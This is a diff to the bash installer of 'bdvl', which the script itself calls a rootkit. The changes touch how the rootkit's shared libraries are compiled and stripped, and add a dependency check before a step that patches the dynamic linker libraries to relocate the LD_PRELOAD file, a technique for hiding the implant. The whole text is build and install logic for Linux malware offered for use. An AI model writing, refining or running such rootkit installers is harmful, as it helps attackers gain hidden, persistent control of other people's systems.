@@ -69,11 +69,13 @@ compile_bdvl(){
                       -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.i686"
 
     # only show gcc output if we want to output verbosely.
-    [ $VERBOSE == 1 ] && `$compile_reg` || `$compile_reg &>/dev/null`
+    [ $VERBOSE == 1 ] && `$compile_reg`
+    [ $VERBOSE == 0 ] && `$compile_reg &>/dev/null`
     strip $BDVLSO.$PLATFORM 2>/dev/null || { eecho "Couldn't strip $BDVLSO.$PLATFORM, exiting"; exit; }
-    [ -f $BDVLSO.$PLATFORM ] && secho "`lib_size $PLATFORM`"
+    secho "`lib_size $PLATFORM`"
 
-    [ $VERBOSE == 1 ] && `$compile_m32` || `$compile_m32 &>/dev/null`
+    [ $VERBOSE == 1 ] && `$compile_m32`
+    [ $VERBOSE == 0 ] && `$compile_m32 &>/dev/null`
     strip $BDVLSO.i686 2>/dev/null || wecho "Couldn't strip $BDVLSO.i686, this is ok"
     [ -f $BDVLSO.i686 ] && secho "`lib_size i686`"
 }
@@ -85,16 +87,24 @@ install_bdvl(){
     }
 
     secho "Starting full installation!\n"
-    wecho "Make sure any essential dependencies are present."
-    wecho "You can install them with '$0 -D'"
+    wecho "All essential dependencies must be present!"
+    wecho "You can install them with '$0 -D' before continuing\n"
 
-    local response="$(show_yesno "Patch dynamic linker libs?")"
-    if [ $response == 0 ]; then
-        necho "Patching dynamic linker libraries, please wait..."
-        LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"   # change default LDSO_PRELOAD to new
-                                                              # preload file location.
-        secho "Finished patching dynamic linker"
-    fi; echo
+    if [ -f "`bin_path xxd`" ]; then
+        local response="$(show_yesno "Patch dynamic linker libs?")"
+        if [ $response == 0 ]; then
+            necho "Patching dynamic linker libraries, please wait..."
+            LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"   # change default LDSO_PRELOAD to new
+                                                                  # preload file location.
+            secho "Finished patching dynamic linker"
+        fi; echo
+    else
+        eecho "Cannot patch the dynamic linker as xxd was not found."
+        eecho "Did you install your dependencies?? :^) ('$0 -D')"
+        eecho "Do this, then try again."
+        wecho "Press enter if you would like to continue anyway..."
+        read
+    fi
 
     # get installation specific settings & compile rootkit
     setup_configuration
